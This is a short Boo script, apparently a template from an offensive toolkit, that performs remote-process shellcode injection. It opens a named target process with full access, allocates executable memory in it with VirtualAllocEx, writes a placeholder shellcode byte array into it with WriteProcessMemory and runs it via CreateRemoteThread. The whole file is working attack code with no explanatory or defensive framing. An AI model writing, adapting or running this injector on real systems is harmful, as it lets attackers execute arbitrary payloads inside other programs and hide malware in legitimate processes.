import System.Runtime.InteropServices
from System.Diagnostics import Process
from System import IntPtr

[DllImport("kernel32.dll")]
def OpenProcess(dwDesiredAccess as int, bInheritHandle as bool, dwProcessID as int) as int:
    pass

[DllImport("kernel32.dll")]
def VirtualAllocEx(hProcess as int, lpAddress as int, dwSize as int, flNewProtect as uint, lpflOldProtect as uint) as int:
    pass

[DllImport("kernel32.dll")]
def WriteProcessMemory(hProcess as int, lpBaseAddress as int, lpBuffer as (byte), nSize as int, lpNumberOfBytesWritten as int) as bool:
    pass

[DllImport("kernel32.dll")]
def CreateRemoteThread(hProcess as int, lpThreadAttributes as int, dwStackSize as uint, lpStartAddress as int, lpParameter as int, dwCreationFlags as uint, lpThreadId as int) as int:
    pass

output = ""

def InjectRemote(sc as (byte), process as string):
    # Process Privileges
    PROCESS_VM_OPERATION = 0x0008 cast int
    PROCESS_VM_WRITE = 0x0020 cast int
    PROCESS_VM_READ = 0x0010 cast int
    PROCESS_ALL = 0x1F0FFF cast int

    # Memory Permissions
    MEM_COMMIT = 0x1000 cast uint
    PAGE_EXECUTE_READWRITE = 0x40 cast uint

    targetProcess = Process.GetProcessesByName(process)[0]
    procHandle = OpenProcess(PROCESS_ALL, false, targetProcess.Id)
    output += "procHandle = $procHandle\n"

    resultPtr = VirtualAllocEx(procHandle cast IntPtr, 0, sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    output += "resultPtr = $resultPtr\n"

    bytesWritten as int = 0;
    resultBool = WriteProcessMemory(procHandle cast IntPtr, resultPtr cast IntPtr, sc, sc.Length, bytesWritten)
    output += "WriteProcessMemory = $resultBool, bytesWritten = $bytesWritten\n"

    CreateRemoteThread(procHandle cast IntPtr, 0, 0, resultPtr cast IntPtr, 0, 0, 0)
    output += "Injected\n"

shellcode = array(byte,(BYTES))

InjectRemote(shellcode, "PROCESS")
